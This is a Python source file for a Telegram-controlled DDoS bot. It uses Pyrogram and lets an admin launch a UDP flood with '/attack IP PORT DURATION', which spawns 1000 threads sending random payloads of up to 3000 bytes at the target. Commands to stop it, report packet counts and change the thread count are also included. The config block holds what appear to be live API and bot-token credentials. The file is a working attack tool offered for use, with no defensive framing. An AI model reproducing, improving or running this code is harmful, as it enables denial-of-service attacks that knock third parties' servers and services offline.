import asyncio
import socket
import time
import os
import random
from threading import Thread
from pyrogram import Client, filters

# ===================== CONFIG =====================
API_ID = 37460343  # CHANGE KARO
API_HASH = "cf2d690b275e8d53a51fc69a15270437"  # CHANGE KARO
BOT_TOKEN = "8649236048:AAGcrxGdeSZpwcjtuMF-9zDKzyVISml-yNQ"  # CHANGE KARO
ADMIN_ID = 8819216195  # CHANGE KARO

# ===================== BOT INIT =====================
bot = Client("udp_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ===================== SUPER ATTACK ENGINE =====================
class Attack:
    def __init__(self):
        self.running = False
        self.threads = 1000
        self.packets = 0
        self.target_ip = ""
        self.target_port = 0
        
    def start(self, ip, port, duration):
        self.running = True
        self.packets = 0
        self.target_ip = ip
        self.target_port = port
        
        # 🔥 ULTRA PAYLOADS
        payloads = []
        for size in range(100, 2000, 10):
            payloads.append(os.urandom(size))
        for _ in range(50):
            payloads.append(os.urandom(random.randint(2000, 3000)))
        
        end = time.time() + duration
        
        def flood():
            sock1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock1.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2*1024*1024)
            sock2.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2*1024*1024)
            
            while time.time() < end and self.running:
                try:
                    payload = random.choice(payloads)
                    for _ in range(5):
                        sock1.sendto(payload, (ip, port))
                        sock2.sendto(payload, (ip, port))
                        self.packets += 2
                except:
                    try:
                        sock1.close()
                        sock2.close()
                    except:
                        pass
                    sock1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        for _ in range(self.threads):
            Thread(target=flood, daemon=True).start()
            
        return f"🔥 SUPER ATTACK ON {ip}:{port} STARTED! ({self.threads} THREADS)"
    
    def stop(self):
        self.running = False
        return f"🛑 STOPPED! Packets: {self.packets:,}"

attack = Attack()

# ===================== COMMANDS (FIXED - NO DOUBLE) =====================

@bot.on_message(filters.command("start") & filters.private)
async def start_cmd(client, msg):
    await msg.reply(
        "💀 **ULTRA UDP BOT READY!**\n\n"
        "`/attack IP PORT DURATION`\n"
        "`/stop`\n"
        "`/status`\n"
        "`/threads COUNT`\n\n"
        "🔥 USE 120s+ FOR BEST EFFECT!"
    )

@bot.on_message(filters.command("attack") & filters.private)
async def attack_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ ADMIN ONLY!")
    
    parts = msg.text.split()
    if len(parts) < 4:
        return await msg.reply("❌ `/attack IP PORT DURATION`")
    
    ip, port, duration = parts[1], int(parts[2]), int(parts[3])
    
    if attack.running:
        return await msg.reply("⚠️ ATTACK RUNNING! Use `/stop`")
    
    # 🔥 SIRF EK BAAR REPLY
    msg1 = await msg.reply(f"⏳ STARTING SUPER ATTACK...")
    result = attack.start(ip, port, duration)
    await msg1.edit_text(f"{result}\n⏱️ {duration}s\n🧵 {attack.threads} THREADS")

@bot.on_message(filters.command("stop") & filters.private)
async def stop_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ ADMIN ONLY!")
    await msg.reply(attack.stop())

@bot.on_message(filters.command("status") & filters.private)
async def status_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ ADMIN ONLY!")
    await msg.reply(f"📊 **STATUS**\n🟢 RUNNING: {attack.running}\n📦 PACKETS: {attack.packets:,}")

@bot.on_message(filters.command("threads") & filters.private)
async def threads_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ ADMIN ONLY!")
    parts = msg.text.split()
    if len(parts) < 2:
        return await msg.reply(f"CURRENT: {attack.threads}")
    attack.threads = int(parts[1])
    await msg.reply(f"✅ THREADS: {attack.threads}")

# ===================== START =====================
print("💀 ULTRA BOT STARTED (DOUBLE FIXED)!")
bot.run()
